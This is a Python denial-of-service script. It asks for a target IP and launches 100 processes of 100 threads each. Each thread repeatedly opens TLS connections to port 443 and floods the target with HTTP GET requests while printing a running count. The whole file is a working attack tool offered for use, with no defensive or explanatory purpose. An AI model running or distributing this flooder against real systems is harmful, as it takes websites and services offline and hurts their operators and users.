import random
import socket
import threading
import ssl
import multiprocessing
import requests

ip = str(input("IP:"))
port = int(443)
protocol = str("GET")

useragents = [""]
acceptall = [""]
ref = [""]
connection = "keep-alive"
content    = "Content-Type: application/x-www-form-urlencoded\r\n"
length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
num_sent = 0
go = threading.Event()
def attack():
    global num_sent, useragents, acceptall, ref, connection, content, length
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept    = random.choice(acceptall)
    referer   = "Referer: " +random.choice(ref) + ip + "\r\n"
    conn = "Connection: " + connection + "\r\n"
    go.wait()
    while True:
        get_host = protocol + " //?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
        request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        num_sent = num_sent + 1
        print("[+] Sent ", num_sent, " => ", ip , ":", port)
        x = ssl.wrap_socket(s)
        try:
            for i in range (100):
                x.send(str.encode(request))
        except:
            x.close()
def build_thread():
	for _ in range(100):
		bth = threading.Thread(target=attack)
		bth.start()

for y in range(100):
    th = multiprocessing.Process (target=build_thread)
    go.set()
    th.start()
